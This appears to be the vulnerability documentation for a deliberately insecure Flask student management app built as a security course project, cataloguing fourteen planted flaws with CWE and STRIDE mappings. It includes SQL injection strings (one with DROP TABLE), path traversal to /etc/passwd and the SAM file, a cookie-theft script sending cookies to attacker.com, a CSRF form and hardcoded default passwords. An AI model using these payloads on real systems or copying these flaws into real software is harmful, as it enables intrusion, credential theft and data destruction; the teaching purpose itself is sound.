# VULNERABILITIES DOCUMENTATION
# Vulnerable Student Management System - Phase 2 Deliverable

## Application Overview
A Flask-based Student Management System intentionally built with multiple security flaws from OWASP Top 10 and Annexure 1.

---

## INTENTIONAL VULNERABILITIES

### 1. SQL INJECTION (CWE-89)
**Location:** [database.py](database.py) - Functions: `authenticate_user()`, `search_students()`, `get_student_details()`, `add_student()`

**Vulnerability Details:**
- Uses string concatenation for SQL queries instead of parameterized queries
- Attackers can inject SQL code through login, search, and add student forms
- Example payload: `' OR '1'='1`

**Attack Scenarios:**
```
Login form SQL Injection:
username: admin' --
password: anything
# Bypasses authentication

Search SQL Injection:
search: ' OR 1=1 --
# Returns all students

Student ID SQL Injection:
/student/1'; DROP TABLE students; --
```

**STRIDE Mapping:** Tampering, Information Disclosure

---

### 2. BRUTE FORCE & CREDENTIAL STUFFING (CWE-307, CWE-384)
**Location:** [app.py](app.py) - `login()` route, `LOGIN_ATTEMPTS` dict

**Vulnerability Details:**
- No rate limiting on login attempts
- No CAPTCHA or account lockout mechanism
- `check_rate_limit()` function always returns True
- Allows unlimited failed login attempts

**Attack Scenario:**
- Attacker can run automated login attempts with common passwords
- No delays between requests
- No notification to users of failed attempts

**STRIDE Mapping:** Spoofing

---

### 3. WEAK AUTHENTICATION & HARDCODED CREDENTIALS (CWE-798, CWE-521)
**Location:** [config.py](config.py), [database.py](database.py)

**Vulnerability Details:**
- Passwords stored in plain text (no hashing)
- Default credentials hardcoded: admin/admin123, user/password
- Weak secret key: 'super_secret_key_12345'
- Default credentials left in `init_db()` function

**STRIDE Mapping:** Spoofing

---

### 4. INSECURE PASSWORD STORAGE (CWE-256, CWE-259)
**Location:** [database.py](database.py) - Database schema

**Vulnerability Details:**
- Passwords stored in plain text in students table
- Roll number used as default password
- No password hashing algorithm (no bcrypt, scrypt, or PBKDF2)

**STRIDE Mapping:** Information Disclosure

---

### 5. SENSITIVE DATA EXPOSURE (CWE-200, CWE-327)
**Location:** [app.py](app.py) - `view_student()`, `view_logs()` routes

**Vulnerability Details:**
- SSN exposed in student details page
- Passwords displayed in plain text
- Sensitive information logged (passwords, SSN, personal data)
- No data encryption in transit or at rest

---

### 6. INSECURE FILE UPLOAD (CWE-434)
**Location:** [app.py](app.py) - `upload_file()` route

**Vulnerability Details:**
- No file extension validation (allows .exe, .sh, .bat, .jsp files)
- No file type checking (MIME type validation absent)
- Uploaded files are executable
- No file size enforcement despite MAX_CONTENT_LENGTH

**Attack Scenario:**
```
Upload malicious.exe or shell.sh and execute remote commands
```

**STRIDE Mapping:** Tampering, Elevation of Privilege

---

### 7. PATH TRAVERSAL (CWE-22)
**Location:** [app.py](app.py) - `upload_file()`, `download_file()` routes

**Vulnerability Details:**
- No sanitization of filename parameter
- Attackers can use `../` to upload/download files outside intended directory
- Can access sensitive files on the system

**Attack Scenario:**
```
Upload: ../../../etc/passwd (on Linux)
Upload: ../../windows/system32/config/sam (on Windows)
Download: ../config.py
Download: ../database.db
```

**STRIDE Mapping:** Information Disclosure, Tampering

---

### 8. BROKEN AUTHENTICATION - SESSION HIJACKING (CWE-384)
**Location:** [config.py](config.py), [app.py](app.py)

**Vulnerability Details:**
- SESSION_COOKIE_SECURE = False (transmitted over HTTP)
- SESSION_COOKIE_HTTPONLY = False (accessible to JavaScript)
- SESSION_COOKIE_SAMESITE = None (CSRF vulnerable)
- No session timeout management
- Long session lifetime (24 hours)

**Attack Scenario:**
```javascript
// JavaScript can steal cookies
document.location = 'http://attacker.com/?cookie=' + document.cookie;
```

**STRIDE Mapping:** Spoofing, Information Disclosure

---

### 9. CROSS-SITE REQUEST FORGERY (CSRF/XSRF) (CWE-352)
**Location:** [app.py](app.py) - All POST endpoints

**Vulnerability Details:**
- No CSRF token implemented
- No anti-CSRF headers or validation
- Session cookies lack SameSite protection
- Forms vulnerable to CSRF attacks

**Attack Scenario:**
```html
<!-- Attacker's website -->
<form action="http://vulnerable-app/add_student" method="POST">
    <input name="roll_no" value="attacker"/>
    <input name="name" value="Hacker"/>
</form>
<script>document.forms[0].submit();</script>
```

**STRIDE Mapping:** Tampering, Elevation of Privilege

---

### 10. INFORMATION DISCLOSURE (CWE-209, CWE-215)
**Location:** Multiple locations - [app.py](app.py)

**Vulnerability Details:**
- Debug mode enabled in production (`debug=True`)
- Detailed error messages expose system information
- SQL queries logged to console
- Stack traces displayed to users
- System paths disclosed in log messages
- Verbose error messages in authentication failures

**Examples:**
```
[DEBUG] Executing query: SELECT * FROM users WHERE...
[ERROR] Authentication failed: [Detailed SQL error message]
Query executed: SELECT path, filename FROM...
```

**STRIDE Mapping:** Information Disclosure

---

### 11. MISSING ACCESS CONTROL (CWE-284, CWE-639)
**Location:** [app.py](app.py) - Multiple routes

**Vulnerability Details:**
- No role-based access control (RBAC)
- No privilege checks on sensitive operations
- Any authenticated user can:
  - View all students and SSN
  - Add/modify students
  - View system logs
  - Upload files to any location
  - Download any file
- Admin and user roles not enforced

**Example:**
```
Regular user can see `/logs` which should be admin-only
```

**STRIDE Mapping:** Elevation of Privilege

---

### 12. PRIVILEGE ESCALATION (CWE-269, CWE-275)
**Location:** [app.py](app.py), [database.py](database.py)

**Vulnerability Details:**
- User role field stored but never checked
- No middleware to enforce role-based access
- Anyone can access admin functions if authenticated
- No proper authorization headers or tokens

**STRIDE Mapping:** Elevation of Privilege

---

### 13. COMMAND INJECTION (CWE-78) - Potential
**Location:** [app.py](app.py) - File operations (future vulnerability)

**Note:** Current implementation doesn't execute OS commands, but file path handling could be exploited for:
- Command injection through filenames
- OS-level path traversal attacks

**STRIDE Mapping:** Elevation of Privilege, Tampering

---

### 14. INSECURE DESERIALIZATION (CWE-502) - Configuration
**Location:** [config.py](config.py) - Session handling

**Vulnerability Details:**
- Flask session files stored in filesystem without encryption
- Session data could be tampered with
- No integrity checking of session cookies

**STRIDE Mapping:** Tampering

---

## VULNERABILITY SUMMARY TABLE

| # | Vulnerability | CWE-ID | CVSS Estimate | Severity |
|---|---|---|---|---|
| 1 | SQL Injection | CWE-89 | 9.0 | Critical |
| 2 | Brute Force / Credential Stuffing | CWE-307, CWE-384 | 7.5 | High |
| 3 | Weak Authentication | CWE-798, CWE-521 | 8.2 | High |
| 4 | Insecure Password Storage | CWE-256 | 8.0 | High |
| 5 | Sensitive Data Exposure | CWE-200 | 8.1 | High |
| 6 | Insecure File Upload | CWE-434 | 8.5 | High |
| 7 | Path Traversal | CWE-22 | 7.5 | High |
| 8 | Session Hijacking | CWE-384 | 8.0 | High |
| 9 | CSRF | CWE-352 | 7.0 | High |
| 10 | Information Disclosure | CWE-209 | 6.5 | Medium |
| 11 | Missing Access Control | CWE-284 | 7.2 | High |
| 12 | Privilege Escalation | CWE-269 | 8.8 | High |
| 13 | Command Injection (Potential) | CWE-78 | 9.0 | Critical |
| 14 | Insecure Deserialization | CWE-502 | 6.0 | Medium |

---

## FILES STRUCTURE

```
ISRM_Proj/
├── app.py                 # Main Flask application with vulnerabilities
├── config.py              # Configuration with weak settings
├── database.py            # Database operations with SQL injection
├── requirements.txt       # Python dependencies
├── templates/
│   └── login.html         # Login form template
├── uploads/               # Directory for uploaded files
├── vulnerable_app.db      # SQLite database (generated on first run)
└── VULNERABILITIES.md     # This documentation
```

---

## HOW TO RUN THE APPLICATION

1. Install dependencies:
```bash
pip install -r requirements.txt
```

2. Run the application:
```bash
python app.py
```

3. Access via browser:
```
http://localhost:5000
```

4. Default credentials:
- Username: `admin`, Password: `admin123`
- Username: `user`, Password: `password`

---

## TESTING RECOMMENDATIONS FOR PHASE 3

Use the following tools to identify vulnerabilities:

### Bandit (Python Security Scanner)
```bash
bandit -r . -ll
```

### OWASP ZAP
- Scan `http://localhost:5000`
- Use automated scanning for SQL Injection
- Test authentication bypass

### Manual Testing
- SQL Injection in `/search` endpoint
- SQL Injection in `/login` endpoint
- File upload with `.exe`, `.sh` files
- Path traversal in `/download/` endpoint
- Session cookie theft
- Brute force on login
- CSRF attacks on POST methods

---

## NOTES FOR LATER PHASES

- **Phase 3:** Scan with Bandit and ZAP, document all findings
- **Phase 4:** Integrate security scanning into CI/CD
- **Phase 5:** Map vulnerabilities to STRIDE threats
- **Phase 6:** Calculate ALE for top 2 risks
- **Phase 7:** Fix vulnerabilities and implement controls
- **Phase 8:** Rescan and verify fixes

